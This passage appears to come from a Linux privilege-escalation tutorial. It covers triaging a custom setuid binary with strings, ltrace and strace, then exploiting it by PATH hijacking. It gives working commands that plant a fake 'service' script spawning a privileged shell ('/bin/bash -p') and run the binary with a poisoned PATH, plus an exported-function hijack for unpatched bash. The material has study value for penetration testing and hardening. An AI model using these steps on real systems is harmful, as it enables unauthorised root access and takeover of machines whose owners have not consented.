When you find a bespoke setuid binary, you need to work out what it does. Three passes, cheapest first:

```bash
file /opt/vendor/helper
strings -n 6 /opt/vendor/helper | less        # look for command names, paths, format strings
ltrace /opt/vendor/helper 2>&1 | head -60     # library calls: system, popen, execl, getenv, fopen
strace -f -e trace=execve,openat,open,access,readlink /opt/vendor/helper 2>&1 | head -80
ldd /opt/vendor/helper
readelf -d /opt/vendor/helper | grep -iE 'rpath|runpath|needed'
checksec --file=/opt/vendor/helper 2>/dev/null
```

`ltrace` and `strace` do not work against a setuid binary when you invoke it as an unprivileged user, because the kernel refuses to let you trace a process that gained privilege (and `ptrace` of a setuid target drops the setuid). What you can do is trace a *copy* of the binary with the setuid bit removed, which shows you the same code paths, just without the privilege:

```bash
cp /opt/vendor/helper /dev/shm/h && chmod u-s /dev/shm/h
strace -f -e trace=execve,openat /dev/shm/h 2>&1 | grep -vE 'ENOENT.*(locale|gconv)'
```

Then read the output looking for exactly four things: a subprocess launched by name rather than absolute path, a file opened from a path you can write, a library searched for in a directory you can write, and any of your input reaching a privileged operation.

#### PATH abuse in binaries that call subprocesses

**Why it works.** `system()` and `popen()` invoke `/bin/sh -c`, which resolves an unqualified program name through `PATH`. `execlp`/`execvp` resolve through `PATH` directly. Since the setuid binary inherits your environment except for the `LD_*` variables (`PATH` is *not* sanitised by the kernel or the loader), an unqualified name means you choose the program.

```bash
# 1. confirm the binary calls something by bare name
strings /opt/vendor/helper | grep -E '^(ps|id|ls|cat|systemctl|service|curl|date|hostname|ifconfig)$'
strace -f -e trace=execve /dev/shm/h 2>&1 | grep execve

# 2. plant a replacement and put your directory first
mkdir -p /dev/shm/.p
printf '#!/bin/bash\nsetsid /bin/bash -p 0<&1\n' > /dev/shm/.p/service
chmod +x /dev/shm/.p/service
PATH=/dev/shm/.p:$PATH /opt/vendor/helper
```

If the target invokes `sh -c` with a string, you can sometimes hijack without touching `PATH` at all by defining an exported shell function, which is only viable if the setuid program invokes bash rather than dash, and only on unpatched bash:

```bash
# only where /bin/sh is bash and the shellshock-era function export behaviour survives
function /usr/sbin/service() { /bin/bash -p; }
export -f /usr/sbin/service
/opt/vendor/helper
```

That is largely historical. `PATH` hijacking is the reliable version.
